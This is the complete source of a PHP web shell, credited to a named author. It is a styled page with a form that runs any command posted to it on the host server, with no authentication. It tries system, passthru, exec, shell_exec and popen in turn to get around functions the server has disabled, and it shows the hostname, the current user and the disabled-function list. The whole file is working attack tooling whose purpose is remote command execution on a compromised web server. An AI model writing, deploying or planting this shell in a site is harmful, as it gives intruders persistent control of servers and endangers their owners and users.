<?php

/*
 * 
 * 
 *          Script Title    :   PHP WebShell
 *          Version         :   1.0
 *          Author          :   Noman Prodhan
 *          Websites        :   www.nomantheking.com  www.nomanprodhan.com
 *          GitHub          :   https://github.com/NomanProdhan
 * 
 * 
 * 
 * 
 * 
 */

function commandExec($param)
{
    echo gethostname() . "@" . get_current_user() . " $ " . $param . "<br>";
    if (! checkFunctions("system")) {
        system($param);
    } else if (! checkFunctions("passthru")) {
        echo passthru($param);
    } else if (! checkFunctions("exec")) {
        echo exec($param);
    } else if (! checkFunctions("shell_exec")) {
        echo shell_exec($param);
    } else if (! checkFunctions("popen")) {
        $handle = popen($param . ' 2>&1', "r");
        $read = fread($handle, 2096);
        echo $read;
        fclose($handle);
    }else{
        echo "Sorry we can't run any system command in this server";
    }
}

function checkFunctions($param)
{
    $disabled_functions = explode(",", ini_get("disable_functions"));
    return in_array($param, $disabled_functions);
}

?>

<!DOCTYPE html>
<head>

<title>Web Shell Version 1.0 - Noman Prodhan</title>
<style type="text/css">
* {
	background: #5b3131;
}

.container {
	margin: 0 auto;
	width: 50%;
	height: 650px;
	background: #263238;
	box-shadow: 0 10px 16px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0
		rgba(0, 0, 0, 0.19) !important;
}

.shell-title {
	background: #546E7A;
	margin-top: 40px;
	height: 10%;
	width: 100%;
	color: #fff;
	font-family: Courier;
	font-size: 30px;
	text-align: center;
}

.shell-sub-title {
	background: #D81B60;
	margin-top: 10px;
	height: 5%;
	width: 100%;
	color: #fff;
	font-family: Courier;
	font-size: 14px;
	text-align: center;
}

span {
	display: inline-block;
	vertical-align: middle;
	background: #546E7A;
	color: #fff;
	font-family: Courier;
	font-size: 30px;
	margin-top: 2%;
}

p {
	display: inline-block;
	vertical-align: middle;
	background: #D81B60;
	color: #fff;
	font-family: Courier;
	font-size: 14px;
	margin-top: 1%;
}

.shell-body {
	margin: 4%;
	background: #37474F;
	height: 400px;
	width: 92%;
	overflow: scroll;
	box-shadow: 0 10px 16px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0
		rgba(0, 0, 0, 0.19) !important;
}

input[type=text] {
	width: 80%;
	padding: 11px 22px;
	margin: 5px;
	box-sizing: border-box;
	background: #37474F;
	color: #76FF03;
	font-family: Courier;
	font-size: 15px;
}

pre {
	color: #76FF03;
	font-family: Courier;
	font-size: 18px;
	background: #37474F;
	text-align: left;
	margin: 5px;
}
</style>

</head>
<body>
	<div class="container">

		<div class="shell-title">
			<span>WebShell 1.0 by Noman Prodhan</span>
		</div>
		<?php if(!empty(ini_get("disable_functions"))){ ?>
		
		<div class="shell-sub-title">
			<p><?php echo "PHP Disabled Functions: " . ini_get("disable_functions"); ?></p>
		</div>
		<?php }?>
		<div class="shell-body">
			<pre><?php

            if (isset($_POST["command"])) {
                commandExec($_POST["command"]);
            }
        ?></pre>


		</div>
		<form action="" method="POST">
			<input type="text" name="command" id="command"
				placeholder="Type command and hit enter">
		</form>


	</div>


</body>